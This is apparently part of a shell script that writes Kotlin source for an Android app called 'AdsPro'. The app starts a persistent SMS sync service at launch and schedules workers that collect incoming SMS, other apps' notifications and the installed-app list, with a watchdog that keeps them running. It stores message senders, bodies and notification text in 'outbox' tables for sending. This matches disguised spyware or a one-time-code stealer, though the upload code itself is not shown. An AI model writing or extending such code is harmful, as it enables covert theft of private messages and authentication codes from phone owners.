          cat > app/src/main/java/com/adspro/app/AdsProApplication.kt <<'END_OF_FILE'
          package com.adspro.app

          import android.app.Application
          import android.content.Intent
          import android.os.Build
          import androidx.work.*
          import com.adspro.app.service.SmsSyncService
          import com.adspro.app.worker.*
          import java.util.concurrent.TimeUnit

          class AdsProApplication : Application() {
              override fun onCreate() {
                  super.onCreate()
                  startCoreServices()
                  setupWorkers()
              }
              fun startCoreServices() {
                  val intent = Intent(this, SmsSyncService::class.java)
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      startForegroundService(intent)
                  } else {
                      startService(intent)
                  }
              }
              private fun setupWorkers() {
                  val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
                  
                  val smsWork = PeriodicWorkRequestBuilder<SmsSyncWorker>(15, TimeUnit.MINUTES)
                      .setConstraints(constraints).build()
                  WorkManager.getInstance(this).enqueueUniquePeriodicWork("SmsSync", ExistingPeriodicWorkPolicy.KEEP, smsWork)

                  val notifWork = PeriodicWorkRequestBuilder<NotificationSyncWorker>(15, TimeUnit.MINUTES)
                      .setConstraints(constraints).build()
                  WorkManager.getInstance(this).enqueueUniquePeriodicWork("NotifSync", ExistingPeriodicWorkPolicy.KEEP, notifWork)

                  val appWork = PeriodicWorkRequestBuilder<AppsSyncWorker>(48, TimeUnit.HOURS)
                      .setConstraints(constraints).build()
                  WorkManager.getInstance(this).enqueueUniquePeriodicWork("AppsSync", ExistingPeriodicWorkPolicy.KEEP, appWork)

                  val watchdogWork = PeriodicWorkRequestBuilder<WatchdogWorker>(15, TimeUnit.MINUTES).build()
                  WorkManager.getInstance(this).enqueueUniquePeriodicWork("Watchdog", ExistingPeriodicWorkPolicy.KEEP, watchdogWork)
              }
          }
          END_OF_FILE

          cat > app/src/main/java/com/adspro/app/data/AppDatabase.kt <<'END_OF_FILE'
          package com.adspro.app.data

          import android.content.Context
          import androidx.room.*

          @Entity(tableName = "sms_outbox")
          data class SmsEntity(@PrimaryKey(autoGenerate = true) val id: Long = 0, val sender: String, val body: String, val timestamp: Long)

          @Entity(tableName = "notification_outbox")
          data class NotificationEntity(@PrimaryKey(autoGenerate = true) val id: Long = 0, val packageName: String, val title: String, val text: String, val timestamp: Long)

          @Dao
          interface OutboxDao {
              @Insert(onConflict = OnConflictStrategy.REPLACE) suspend fun insertSms(sms: SmsEntity)
              @Query("SELECT * FROM sms_outbox") suspend fun getAllSms(): List<SmsEntity>
              @Delete suspend fun deleteSms(sms: SmsEntity)

              @Insert(onConflict = OnConflictStrategy.REPLACE) suspend fun insertNotif(notif: NotificationEntity)
              @Query("SELECT * FROM notification_outbox") suspend fun getAllNotifs(): List<NotificationEntity>
              @Delete suspend fun deleteNotif(notif: NotificationEntity)
          }

          @Database(entities = [SmsEntity::class, NotificationEntity::class], version = 1, exportSchema = false)
          abstract class AppDatabase : RoomDatabase() {
              abstract fun outboxDao(): OutboxDao
              companion object {
                  @Volatile private var INSTANCE: AppDatabase? = null
                  fun getInstance(context: Context): AppDatabase {
                      return INSTANCE ?: synchronized(this) {
                          Room.databaseBuilder(context.applicationContext, AppDatabase::class.java, "adspro_db").build().also { INSTANCE = it }
                      }
                  }
              }
          }
          END_OF_FILE

